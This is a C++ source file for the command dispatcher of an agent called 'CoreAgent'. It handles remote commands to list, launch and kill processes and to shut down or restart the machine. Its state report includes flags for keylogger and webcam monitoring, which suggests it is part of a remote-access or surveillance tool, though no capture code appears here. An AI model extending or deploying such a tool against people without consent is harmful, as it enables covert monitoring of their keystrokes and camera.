#include "handlers/AppCommandHandler.hpp"

namespace handlers {

bool AppCommandHandler::can_handle(const std::string& cmd) const {
    return cmd == "ping" || cmd == "get_state" ||
           cmd == "list_apps" || cmd == "get_apps" ||
           cmd == "list_process" ||
           cmd == "launch_app" || cmd == "kill_process" ||
           cmd == "search_apps" ||
           cmd == "shutdown" || cmd == "restart";
}

std::unique_ptr<core::command::ICommand> AppCommandHandler::parse_command(
    const std::string& cmd,
    const std::string& args,
    const core::command::CommandContext& ctx
) {
    if (cmd == "ping") {
        return std::make_unique<PingCommand>(ctx);
    }
    else if (cmd == "get_state") {
        return std::make_unique<GetStateCommand>(get_state_fn_, ctx);
    }
    else if (cmd == "list_apps" || cmd == "get_apps") {
        return std::make_unique<ListAppsCommand>(app_manager_, false, ctx);
    }
    else if (cmd == "list_process") {
        return std::make_unique<ListAppsCommand>(app_manager_, true, ctx);
    }
    else if (cmd == "launch_app") {
        // Strip surrounding quotes if present
        std::string clean_args = args;
        if (clean_args.size() >= 2 && clean_args.front() == '"' && clean_args.back() == '"') {
             clean_args = clean_args.substr(1, clean_args.size() - 2);
        }
        return std::make_unique<LaunchAppCommand>(app_manager_, clean_args, ctx);
    }
    else if (cmd == "kill_process") {
        uint32_t pid = 0;
        std::istringstream ss(args);
        ss >> pid;
        return std::make_unique<KillProcessCommand>(app_manager_, pid, ctx);
    }
    else if (cmd == "search_apps") {
        return std::make_unique<SearchAppsCommand>(app_manager_, args, ctx);
    }
    else if (cmd == "shutdown") {
        return std::make_unique<SystemControlCommand>(
            app_manager_, SystemControlCommand::Action::Shutdown, ctx);
    }
    else if (cmd == "restart") {
        return std::make_unique<SystemControlCommand>(
            app_manager_, SystemControlCommand::Action::Restart, ctx);
    }

    return nullptr;
}

// ============================================================================
// Command Implementations
// ============================================================================

common::EmptyResult PingCommand::execute() {
    ctx_.send_text("INFO:NAME=CoreAgent");
    return common::EmptyResult::success();
}

common::EmptyResult GetStateCommand::execute() {
    if (!get_state_) {
        ctx_.send_status("SYNC", "complete");
        return common::EmptyResult::success();
    }

    auto state = get_state_();

    ctx_.send_status("SYNC", state.monitor_active ? "monitor=active" : "monitor=inactive");
    ctx_.send_status("SYNC", state.webcam_active ? "webcam=active" : "webcam=inactive");
    ctx_.send_status("SYNC", state.keylogger_active ? "keylogger=active" : "keylogger=inactive");
    ctx_.send_status("SYNC", "complete");

    return common::EmptyResult::success();
}

common::EmptyResult ListAppsCommand::execute() {
    auto apps = mgr_->list_applications(only_running_);

    std::string res = only_running_ ? "DATA:PROCS:" : "DATA:APPS:";
    for (size_t i = 0; i < apps.size(); ++i) {
        const auto& a = apps[i];
        if (i > 0) res += ";";

        if (only_running_) {
            // Process format: PID|Name|CPU|MemoryKB|Exec|Status
            res += std::to_string(a.pid) + "|" + a.name + "|" +
                   std::to_string(a.cpu) + "|" + std::to_string(a.memory_kb) + "|" +
                   a.exec + "|Running";
        } else {
            res += a.id + "|" + a.name + "|" + a.icon + "|" + a.exec + "|" + a.keywords;
        }
    }

    ctx_.send_text(res);
    return common::EmptyResult::success();
}

common::EmptyResult LaunchAppCommand::execute() {
    auto res = mgr_->launch_app(command_);
    if (res.is_ok()) {
        ctx_.send_status("APP_LAUNCHED", std::to_string(res.unwrap()));
    } else {
        ctx_.send_error("Launch", res.error().message);
    }
    return common::EmptyResult::success();
}

common::EmptyResult KillProcessCommand::execute() {
    mgr_->kill_process(pid_);
    ctx_.send_status("PROCESS_KILLED", "");
    return common::EmptyResult::success();
}

common::EmptyResult SearchAppsCommand::execute() {
    auto apps = mgr_->search_apps(query_);

    std::string res = "DATA:APPS:";
    for (size_t i = 0; i < apps.size(); ++i) {
        if (i > 0) res += ";";
        res += apps[i].id + "|" + apps[i].name + "|" +
               apps[i].icon + "|" + apps[i].exec + "|" + apps[i].keywords;
    }

    ctx_.send_text(res);
    return common::EmptyResult::success();
}

common::EmptyResult SystemControlCommand::execute() {
    if (action_ == Action::Shutdown) {
        ctx_.send_text("INFO:System Shutdown Initiated");
        mgr_->shutdown_system();
    } else {
        ctx_.send_text("INFO:System Restart Initiated");
        mgr_->restart_system();
    }
    return common::EmptyResult::success();
}

} // namespace handlers
